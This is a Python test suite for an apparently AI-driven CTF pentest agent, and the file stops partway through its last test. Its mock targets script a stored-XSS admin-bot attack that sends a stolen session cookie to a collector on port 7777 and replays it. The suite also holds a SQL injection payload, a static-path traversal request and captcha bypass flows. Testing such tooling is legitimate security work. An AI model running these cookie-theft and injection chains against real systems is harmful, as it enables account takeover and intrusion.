from __future__ import annotations

import asyncio
from types import SimpleNamespace

import pytest

from pentestagent.agents.pa_agent.ctf_dispatcher import (
    CTFTaskDispatcher,
    _normalize_contact_captcha_text,
    _normalize_exploration_url,
    _solve_contact_pow_solution,
)
from pentestagent.agents.pa_agent.capability_registry import CapabilityEntry
from pentestagent.agents.pa_agent.ctf_planner import find_auth_form
from pentestagent.agents.pa_agent.ctf_state import CTFState
from pentestagent.agents.pa_agent.strategy_memory import (
    ChallengeFingerprint,
    StrategyMemoryEntry,
    StrategyMemoryEntryMetadata,
    StrategyMemoryStore,
)
from pentestagent.tools.notes import set_notes_file
import pentestagent.tools.notes as notes_module
import pentestagent.agents.pa_agent.ctf_dispatcher as ctf_dispatcher


def test_collector_public_host_prefers_host_docker_internal_for_local_targets(monkeypatch):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._guess_local_ip",
        lambda: "100.2.198.163",
    )
    from pentestagent.agents.pa_agent.ctf_dispatcher import _collector_public_host_for_target

    assert _collector_public_host_for_target("http://127.0.0.1:3000") == "host.docker.internal"
    assert _collector_public_host_for_target("http://localhost:3000") == "host.docker.internal"


class _DispatcherRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.saved_payload = ""

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://127.0.0.1:3000/", "title": "easy_login"}
        if action == "get_content":
            return {
                "content": "easy_login /login /visit /admin",
                "html": """
                <html><body>
                  <form action="http://127.0.0.1:3000/login" method="post">
                    <input name="username" />
                    <input name="password" />
                    <textarea name="bio"></textarea>
                  </form>
                  <a href="/visit">visit</a>
                  <a href="/admin">admin</a>
                </body></html>
                """,
            }
        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://127.0.0.1:3000/login",
                        "method": "post",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"},
                            {"name": "bio", "type": "textarea"},
                        ],
                    }
                ]
            }
        if action == "get_cookies":
            return {"cookie_string": "sid=guest"}
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        if action == "post" and kwargs.get("url") == "http://127.0.0.1:3000/login":
            self.saved_payload = kwargs.get("data", {}).get("bio", "")
            return {"status_code": 200, "body": "login stored payload"}

        if action == "request" and kwargs.get("method") == "POST" and kwargs.get("url") == "http://127.0.0.1:3000/visit":
            await self._trigger_collector()
            return {"status_code": 200, "body": "visit triggered"}

        if action == "request" and kwargs.get("method") == "GET" and kwargs.get("url") == "http://127.0.0.1:3000/admin":
            cookie = (kwargs.get("headers") or {}).get("Cookie", "")
            if "sid=stolen-admin" in cookie:
                return {"status_code": 200, "body": "flag{dispatcher_ok}"}
            return {"status_code": 403, "body": "forbidden"}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")

    async def _trigger_collector(self):
        import re
        import urllib.parse

        match = re.search(r"http://(?:127\.0\.0\.1|host\.docker\.internal):7777", self.saved_payload)
        assert match, self.saved_payload
        reader, writer = await asyncio.open_connection("127.0.0.1", 7777)
        writer.write(
            b"GET /c?sid=sid%3Dstolen-admin HTTP/1.1\r\nHost: 127.0.0.1:7777\r\nConnection: close\r\n\r\n"
        )
        await writer.drain()
        await reader.read()
        writer.close()
        await writer.wait_closed()


class _VisitUrlExhaustedRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[tuple[str, str, dict[str, object]]] = []

    async def proxy_action(self, action: str, **kwargs):
        self.requests.append((action, str(kwargs.get("url") or ""), dict(kwargs)))
        return {"status_code": 200, "body": "visit triggered"}

    async def browser_action(self, action: str, **kwargs):
        return {"error": f"unexpected action: {action}"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _LocalChallengeLogPivotRuntime:
    def __init__(self, expected_password: str):
        self.environment = SimpleNamespace(available_tools=["terminal", "http_request"])
        self.expected_password = expected_password
        self.commands: list[str] = []
        self.requests: list[tuple[str, str, dict[str, object]]] = []

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://127.0.0.1:3000/", "title": "easy_login"}
        if action == "get_content":
            return {
                "content": "easy_login /login /admin",
                "html": """
                <html><body>
                  <form action="http://127.0.0.1:3000/login" method="post">
                    <input name="username" />
                    <input name="password" type="password" />
                  </form>
                  <a href="/admin">admin</a>
                </body></html>
                """,
            }
        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://127.0.0.1:3000/login",
                        "method": "post",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"},
                        ],
                    }
                ]
            }
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.requests.append((action, str(kwargs.get("url") or ""), dict(kwargs)))
        url = str(kwargs.get("url") or "")
        method = str(kwargs.get("method") or "").upper()

        if action == "get" and url == "http://127.0.0.1:3000/":
            return {"status_code": 200, "body": "<html>login</html>", "final_url": url}

        if action == "request" and method == "POST" and url == "http://127.0.0.1:3000/login":
            data = kwargs.get("data") or {}
            if data.get("username") == "admin" and data.get("password") == self.expected_password:
                return {
                    "status_code": 200,
                    "body": '{"ok":true,"sid":"sid-admin"}',
                    "headers": {"set-cookie": "sid=sid-admin; Path=/"},
                    "final_url": "http://127.0.0.1:3000/",
                }
            return {"status_code": 401, "body": '{"error":"invalid credentials"}'}

        if action == "request" and method == "GET" and url == "http://127.0.0.1:3000/admin":
            cookie = str((kwargs.get("headers") or {}).get("Cookie") or "")
            if "sid=sid-admin" in cookie:
                return {"status_code": 200, "body": "flag{local_compose_log_pivot_ok}"}
            return {"status_code": 403, "body": '{"error":"admin only"}'}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        self.commands.append(command)
        return SimpleNamespace(
            exit_code=0,
            stdout=f"[init] Admin password set to: {self.expected_password}\n",
            stderr="",
        )


class _LocalChallengeSessionCookiePivotRuntime:
    def __init__(self, expected_password: str):
        self.environment = SimpleNamespace(available_tools=["terminal", "http_request"])
        self.expected_password = expected_password
        self.commands: list[str] = []
        self.requests: list[tuple[str, str, dict[str, object]]] = []

    async def browser_action(self, action: str, **kwargs):
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.requests.append((action, str(kwargs.get("url") or ""), dict(kwargs)))
        url = str(kwargs.get("url") or "")
        method = str(kwargs.get("method") or "").upper()

        if action == "request" and method == "POST" and url == "http://127.0.0.1:3000/login":
            data = kwargs.get("data") or {}
            if data.get("username") == "admin" and data.get("password") == self.expected_password:
                return {
                    "status_code": 200,
                    "body": '{"ok":true}',
                    "headers": {"set-cookie": "sessionid=django-admin-session; Path=/"},
                    "final_url": "http://127.0.0.1:3000/",
                }
            return {"status_code": 401, "body": '{"error":"invalid credentials"}'}

        if action == "request" and method == "GET" and url == "http://127.0.0.1:3000/admin":
            cookie = str((kwargs.get("headers") or {}).get("Cookie") or "")
            if "sessionid=django-admin-session" in cookie:
                return {"status_code": 200, "body": "flag{session_cookie_pivot_ok}"}
            return {"status_code": 403, "body": '{"error":"admin only"}'}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        self.commands.append(command)
        return SimpleNamespace(
            exit_code=0,
            stdout=f"[init] Admin password set to: {self.expected_password}\n",
            stderr="",
        )


class _DispatcherSQLiRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://ctf.local/", "title": "EasySQL"}
        if action == "get_content":
            return {
                "content": "用户登陆 username password",
                "html": """
                <html><body>
                  <form action="http://ctf.local/check.php" method="get">
                    <input name="username" type="text" />
                    <input name="password" type="text" />
                  </form>
                </body></html>
                """,
            }
        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://ctf.local/check.php",
                        "method": "get",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "text"},
                        ],
                    }
                ]
            }
        if action == "get_cookies":
            return {"cookie_string": ""}
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        if action != "request":
            return {"status_code": 404, "body": ""}

        url = kwargs.get("url", "")
        if "check.php" in url and "username=ctf_probe_user" in url:
            return {"status_code": 200, "body": "NO,Wrong username password！！！"}
        if "check.php" in url and "1%27+or+1%3D1%23" in url:
            return {
                "status_code": 200,
                "body": "Login Success! flag{dispatcher_sqli_ok}",
            }
        return {"status_code": 200, "body": "NO,Wrong username password！！！"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherProxyFallbackSQLiRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        if action == "get" and kwargs.get("url", "").rstrip("/") == "http://ctf.local":
            return {
                "status_code": 200,
                "body": """
                <html><body>
                  <form action="/check.php" method="get">
                    <input name="username" type="text" />
                    <input name="password" type="text" />
                  </form>
                </body></html>
                """,
            }
        if action == "request":
            url = kwargs.get("url", "")
            if "check.php" in url and "username=ctf_probe_user" in url:
                return {"status_code": 200, "body": "NO,Wrong username password！！！"}
            if "check.php" in url and "1%27+or+1%3D1%23" in url:
                return {
                    "status_code": 200,
                    "body": "Login Success! flag{dispatcher_proxy_fallback_ok}",
                }
            return {"status_code": 200, "body": "NO,Wrong username password！！！"}
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherMissingReconDepsRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        return {"error": "httpx not installed. Install with: pip install httpx"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherBrowserProbeFallbackRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.browser_calls: list[str] = []
        self.proxy_calls: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        self.browser_calls.append(action)
        if action == "diagnose":
            return {
                "available": False,
                "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium",
            }
        return {"error": f"unexpected browser action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.proxy_calls.append(action)
        if action == "get":
            return {
                "status_code": 200,
                "body": """
                <html><body>
                  <form action="/login" method="post">
                    <input name="username" type="text" />
                    <input name="password" type="password" />
                  </form>
                </body></html>
                """,
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherPostAuthBootstrapRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.proxy_calls: list[tuple[str, str]] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        self.proxy_calls.append((action, url))
        if action == "get" and url.rstrip("/") == "http://ctf.local":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/",
                "body": """
                <html><body>
                  <form action="/" method="post">
                    <input name="username" type="text" />
                    <input name="password" type="text" />
                    <input name="csrfmiddlewaretoken" type="hidden" value="csrf-demo" />
                  </form>
                </body></html>
                """,
                "headers": {"set-cookie": "csrftoken=csrf-demo; Path=/"},
                "redirect_history": [],
            }
        if action == "request" and kwargs.get("method") == "POST" and url in {"http://ctf.local/", "http://ctf.local"}:
            body = kwargs.get("data") or {}
            if body.get("username", "").startswith("ctf_probe_"):
                return {
                    "status_code": 200,
                    "final_url": "http://ctf.local/urlstorage",
                    "body": """
                    <html><body>
                      <h3>Store your URL for free</h3>
                      <form method="POST">
                        <input name="url" type="text" value="https://example.com" />
                      </form>
                      <a href="flag?token=deadbeefdeadbeefdeadbeefdeadbeef">Get Flag</a>
                      <a href="contact">Contact</a>
                      <a href="logout">Logout</a>
                    </body></html>
                    """,
                    "headers": {"set-cookie": "sessionid=demo-session; Path=/"},
                    "redirect_history": [
                        {"status_code": 302, "url": "http://ctf.local/", "location": "/urlstorage"}
                    ],
                }
        if action == "get" and url == "http://ctf.local/urlstorage":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/urlstorage",
                "body": """
                <html><head><title>URL Storage</title></head><body>
                  <h3>Store your URL for free</h3>
                  <form method="POST">
                    <input name="url" type="text" value="https://example.com" />
                  </form>
                  <a href="flag?token=deadbeefdeadbeefdeadbeefdeadbeef">Get Flag</a>
                  <a href="contact">Contact</a>
                  <a href="logout">Logout</a>
                </body></html>
                """,
                "headers": {},
                "redirect_history": [],
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherPostAuthBootstrapCsrfFailureRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.proxy_calls: list[tuple[str, str, str | None]] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        method = kwargs.get("method")
        self.proxy_calls.append((action, url, method))
        if action == "get" and url.rstrip("/") == "http://ctf.local":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/",
                "body": """
                <html><body>
                  <form action="/" method="post">
                    <input name="username" type="text" />
                    <input name="password" type="text" />
                    <input name="csrfmiddlewaretoken" type="hidden" value="csrf-demo" />
                  </form>
                </body></html>
                """,
                "headers": {"set-cookie": "csrftoken=csrf-demo; Path=/"},
            }
        if action == "request" and method == "POST" and url in {"http://ctf.local/", "http://ctf.local"}:
            return {
                "status_code": 403,
                "final_url": "http://ctf.local/",
                "body": "403 Forbidden CSRF verification failed. Request aborted.",
                "headers": {},
                "redirect_history": [],
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherSQLiSubmitRejectRuntime(_DispatcherSQLiRuntime):
    async def proxy_action(self, action: str, **kwargs):
        if (
            action == "request"
            and kwargs.get("method") == "POST"
            and kwargs.get("url") == "http://submit.local/flag"
        ):
            return {"status_code": 200, "body": "wrong flag"}
        return await super().proxy_action(action, **kwargs)


class _DispatcherLegacyBrowserRuntime(_DispatcherSQLiRuntime):
    async def browser_action(self, action: str, **kwargs):
        if action == "diagnose":
            return {"error": "unexpected action: diagnose"}
        return await super().browser_action(action, **kwargs)


class _DispatcherRenderSurfaceDedupeRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}

        url = kwargs.get("url", "")
        self.requests.append(url)

        if url.rstrip("/") == "http://ctf.local":
            return {
                "status_code": 200,
                "body": """
                <html><body>
                  <a href="/file?filename=/flag.txt&filehash=deadbeef">/flag.txt</a>
                  <a href="/file?filename=/welcome.txt&filehash=beadfeed">/welcome.txt</a>
                  <a href="/file?filename=/hints.txt&filehash=cafebabe">/hints.txt</a>
                  <a href="/a">/a</a>
                </body></html>
                """,
            }

        if url in {
            "http://ctf.local/hints.txt",
            "http://ctf.local/welcome.txt",
            "http://ctf.local/flag.txt",
            "http://ctf.local/a",
        }:
            return {"status_code": 404, "body": "not found"}

        if "filename=%2Fflag.txt&filehash=deadbeef" in url or "filename=/flag.txt&filehash=deadbeef" in url:
            return {"status_code": 200, "body": "/flag.txt<br>flag in /fllllllllllllag"}
        if "filename=%2Fwelcome.txt&filehash=beadfeed" in url or "filename=/welcome.txt&filehash=beadfeed" in url:
            return {"status_code": 200, "body": "/welcome.txt<br>render"}
        if "filename=%2Fhints.txt&filehash=cafebabe" in url or "filename=/hints.txt&filehash=cafebabe" in url:
            return {"status_code": 200, "body": "/hints.txt<br>md5(cookie_secret+md5(filename))"}

        if "/file?filename=" in url:
            return {
                "status_code": 200,
                "body": "ORZ",
                "final_url": "http://ctf.local/error?msg=Error",
                "redirect_history": [
                    {
                        "status_code": 302,
                        "url": url,
                        "location": "/error?msg=Error",
                    }
                ],
            }

        if "/error?msg=" in url:
            return {"status_code": 200, "body": "ORZ"}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherStaticSourceLeakRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[str] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        if action != "get":
            return {"status_code": 404, "body": ""}

        url = kwargs.get("url", "")
        self.requests.append(url)
        if url == "http://ctf.local/static../views.py":
            return {
                "status_code": 200,
                "body": (
                    "from django.shortcuts import render\n"
                    "from django.http import HttpResponse\n\n"
                    "def flag(request):\n"
                    "    return HttpResponse('ok')\n"
                ),
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherUnicodeNumericRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[tuple[str, str, dict[str, str] | None]] = []

    async def browser_action(self, action: str, **kwargs):
        if action == "navigate":
            return {"url": "http://ctf.local/", "title": "Unicorn Shop"}
        if action == "get_content":
            return {
                "content": "Unicorn Shop Purchase Item ID Price Only one char allowed!",
                "html": """
                <html><body>
                  <h1>Unicorn Shop</h1>
                  <p>Only one char allowed!</p>
                  <form action="http://ctf.local/charge" method="post">
                    <input name="id" type="text" />
                    <input name="price" type="text" />
                  </form>
                </body></html>
                """,
            }
        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://ctf.local/charge",
                        "method": "post",
                        "inputs": [
                            {"name": "id", "type": "text"},
                            {"name": "price", "type": "text"},
                        ],
                    }
                ]
            }
        if action == "get_cookies":
            return {"cookie_string": ""}
        return {"error": f"unexpected action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        if action != "request":
            return {"status_code": 404, "body": ""}

        url = kwargs.get("url", "")
        data = kwargs.get("data") or {}
        self.requests.append((action, url, dict(data)))
        if url == "http://ctf.local/charge" and str(data.get("id")) == "4":
            if str(data.get("price")) == "1":
                return {"status_code": 200, "body": "You don't have enough money!"}
            if str(data.get("price")) == "万":
                return {"status_code": 200, "body": "Purchase ok flag{dispatcher_unicode_numeric_ok}"}
            if str(data.get("price")) in {"萬", "፼", "ↈ"}:
                return {"status_code": 200, "body": "still testing"}
        return {"status_code": 200, "body": "Only one char allowed!"}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherContactReportRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[tuple[str, str, str | None]] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        method = kwargs.get("method")
        self.requests.append((action, url, method))

        if action == "get" and url == "http://ctf.local/contact":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/contact",
                "body": """
                <html><body>
                  <form action="/contact" method="post">
                    <input name="csrfmiddlewaretoken" type="hidden" value="csrf-demo" />
                    <input name="captcha_0" type="hidden" value="cap-key" />
                    <input name="captcha_1" type="text" />
                    <input name="pow" type="text" />
                    <textarea name="desc"></textarea>
                    <input name="url" type="text" value="" />
                  </form>
                  <script src="/static/pow.py"></script>
                </body></html>
                """,
            }

        if action == "request" and method == "POST" and url == "http://ctf.local/contact":
            return {
                "status_code": 500,
                "final_url": "http://ctf.local/contact",
                "body": "invalid captcha",
            }

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherContactReportPrefersActualContactRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[tuple[str, str, str | None]] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        method = kwargs.get("method")
        self.requests.append((action, url, method))

        if action == "get" and "flag?token=" in url:
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/?next=/flag%3Ftoken%3Ddeadbeef",
                "body": """
                <html><body>
                  <form action="/" method="post">
                    <input name="username" type="text" />
                    <input name="password" type="text" />
                    <input name="csrfmiddlewaretoken" type="hidden" value="csrf-demo" />
                  </form>
                </body></html>
                """,
            }

        if action == "get" and url == "http://ctf.local/contact":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/contact",
                "body": """
                <html><body>
                  <p>Admin defaultly only sees your message 3 seconds.</p>
                  <form action="/contact" method="post">
                    <input name="csrfmiddlewaretoken" type="hidden" value="csrf-demo" />
                    <input name="captcha_0" type="hidden" value="cap-key" />
                    <input name="captcha_1" type="text" />
                    <input name="pow" type="text" />
                    <textarea name="desc"></textarea>
                    <input name="url" type="text" value="" />
                  </form>
                  <script src="/static/pow.py"></script>
                </body></html>
                """,
            }

        if action == "request" and method == "POST" and url == "http://ctf.local/contact":
            return {
                "status_code": 500,
                "final_url": "http://ctf.local/contact",
                "body": "invalid captcha",
            }

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherContactReportSolvedRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[tuple[str, str, str | None, dict]] = []

    async def browser_action(self, action: str, **kwargs):
        return {
            "error": "Playwright not installed. Install with:\n  pip install playwright\n  playwright install chromium"
        }

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        method = kwargs.get("method")
        data = dict(kwargs.get("data") or {}) if isinstance(kwargs.get("data"), dict) else {}
        self.requests.append((action, url, method, data))

        if action == "get" and url == "http://ctf.local/contact":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/contact",
                "body": """
                <html><body>
                  <p>Customer satisfaction is one of the admin's top priorities!</p>
                  <form method="POST">
                    <textarea id="desc" name="desc"></textarea>
                    <input type="text" id="url" name="url">
                    <input type="hidden" name="csrfmiddlewaretoken" value="csrf-demo">
                    <p><label for="id_captcha_1">Captcha:</label> <img src="/captcha/image/aa04b5dac66c9b9e258649792892e6a8e4df63ee/" alt="captcha" class="captcha" />
                    <input type="hidden" name="captcha_0" value="aa04b5dac66c9b9e258649792892e6a8e4df63ee" required id="id_captcha_0"><input type="text" name="captcha_1" required id="id_captcha_1"></p>
                    <label for="pow">Solution for proof of work challenge: 1_test</label>
                    <input type="text" id="pow" name="pow">
                    <input type="submit" class="button" value="Submit">
                  </form>
                </body></html>
                """,
            }

        if action == "request" and method == "POST" and url == "http://ctf.local/contact":
            if (
                data.get("captcha_0") == "aa04b5dac66c9b9e258649792892e6a8e4df63ee"
                and data.get("captcha_1") == "15"
                and data.get("pow") == "0"
            ):
                return {
                    "status_code": 200,
                    "final_url": "http://ctf.local/urlstorage",
                    "body": "reported",
                    "headers": {"set-cookie": "sessionid=demo; Path=/"},
                }
            return {"status_code": 500, "final_url": "http://ctf.local/contact", "body": "invalid captcha"}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _DispatcherContactReportBypassRuntime:
    def __init__(self):
        self.requests = []

    async def proxy_action(self, action: str, **kwargs):
        url = kwargs.get("url", "")
        method = kwargs.get("method")
        data = dict(kwargs.get("data") or {}) if isinstance(kwargs.get("data"), dict) else {}
        self.requests.append((action, url, method, data))

        if action == "get" and url == "http://ctf.local/contact":
            return {
                "status_code": 200,
                "final_url": "http://ctf.local/contact",
                "body": """
                <html><body>
                  <form method="POST">
                    <textarea id="desc" name="desc"></textarea>
                    <input type="text" id="url" name="url">
                    <input type="hidden" name="csrfmiddlewaretoken" value="csrf-demo">
                    <input type="hidden" name="captcha_0" value="cap-key" required>
                    <input type="text" name="captcha_1" required>
                    <input type="text" id="pow" name="pow">
                    <input type="submit" class="button" value="Submit">
                  </form>
                </body></html>
                """,
            }

        if action == "request" and method == "POST" and url == "http://ctf.local/contact":
            if data.get("captcha_0") == "cap-key" and data.get("captcha_1") == "3":
                return {
                    "status_code": 200,
                    "final_url": "http://ctf.local/urlstorage",
                    "body": """
                    <html><body>
                      <h3>Store your URL for free</h3>
                      <input type="submit" value="Save changes" class="button">
                      <a href="flag?token=deadbeef" class="button">Get Flag</a>
                      <a href="logout" class="button">Logout</a>
                    </body></html>
                    """,
                    "headers": {},
                }
            return {"status_code": 500, "final_url": "http://ctf.local/contact", "body": "invalid captcha"}

        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 180):
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _FakeLLM:
    def __init__(self, responses):
        self.responses = list(responses)
        self.calls: list[str] = []

    def generate(self, prompt: str):
        self.calls.append(prompt)
        if not self.responses:
            return '{"action_type":"stop","tool_name":"terminal","rationale":"done","payload":{},"expected_signal":"status 200","next_if_fail":"switch chain"}'
        current = self.responses.pop(0)
        if isinstance(current, str):
            return current
        import json

        return json.dumps(current, ensure_ascii=False)


class _ProjectStyleLLM:
    def __init__(self, response_text: str, finish_reason: str = "stop"):
        self.response_text = response_text
        self.finish_reason = finish_reason
        self.calls: list[dict[str, object]] = []

    async def generate(
        self,
        system_prompt,
        messages,
        tools=None,
        stream=False,
        max_tokens=None,
        task_hint="default",
    ):
        self.calls.append(
            {
                "system_prompt": system_prompt,
                "messages": list(messages),
                "tools": tools,
                "task_hint": task_hint,
            }
        )
        return SimpleNamespace(
            content=self.response_text,
            finish_reason=self.finish_reason,
        )


class _LLMExplorationRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.requests: list[dict[str, object]] = []
        self.commands: list[str] = []

    async def proxy_action(self, action: str, **kwargs):
        if action != "request":
            return {"status_code": 404, "body": ""}
        self.requests.append(dict(kwargs))
        url = str(kwargs.get("url") or "")
        if url.endswith("/robots.txt"):
            return {"status_code": 200, "body": "User-agent: *\nDisallow: /admin"}
        if url.endswith("/admin"):
            return {"status_code": 200, "body": "admin panel"}
        if "check.php" in url:
            return {"status_code": 200, "body": "SQLi probe response"}
        if url.endswith("/admin/secret.txt"):
            return {"status_code": 200, "body": "flag{llm_verified_ok}"}
        return {"status_code": 200, "body": "ok"}

    async def execute_command(self, command: str, timeout: int = 180):
        self.commands.append(command)
        return SimpleNamespace(exit_code=0, stdout="", stderr="")


class _FakeOwnedFailoverMonitor:
    def __init__(self):
        self.stop_calls = 0

    async def stop(self):
        self.stop_calls += 1


@pytest.mark.asyncio
async def test_ctf_dispatcher_solves_stored_xss(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._guess_local_ip",
        lambda: "127.0.0.1",
    )
    set_notes_file(tmp_path / "notes.json")
    notes_module._notes.clear()

    runtime = _DispatcherRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        type="xss",
        hint="",
    )

    assert result.success is True
    assert result.flag == "flag{dispatcher_ok}"
    assert "xss" in result.chain_used
    assert result.reason
    assert dispatcher.state is not None
    assert any(
        item.kind == "xss_admin_bot_sid" for item in dispatcher.state.hypotheses
    )
    assert any(
        record.value == "flag{dispatcher_ok}"
        for record in dispatcher.state.verified_flags
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_visit_url_modes_exhausted_without_sid_or_flag_is_not_progress(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_visit_url_exhausted.json")
    notes_module._notes.clear()

    hits = iter(
        [
            "/c?err=TypeError%3A%20Failed%20to%20fetch",
            "/c?cookie=",
            "/c?iframeErr=TypeError%3A%20Cannot%20read%20properties%20of%20null%20%28reading%20%27body%27%29",
            None,
        ]
    )

    class _FakeCollectorServer:
        instances: list["_FakeCollectorServer"] = []

        def __init__(self, target_base: str, host: str = "0.0.0.0", port: int = 7777):
            self.target_base = target_base
            self.host = host
            self.port = port
            self.started = 0
            self.stopped = 0
            self.wait_calls = 0
            _FakeCollectorServer.instances.append(self)

        @property
        def base_url(self) -> str:
            return "http://host.docker.internal:7777"

        def exploit_url(self, mode: str) -> str:
            return f"{self.base_url}/exploit.html?mode={mode}"

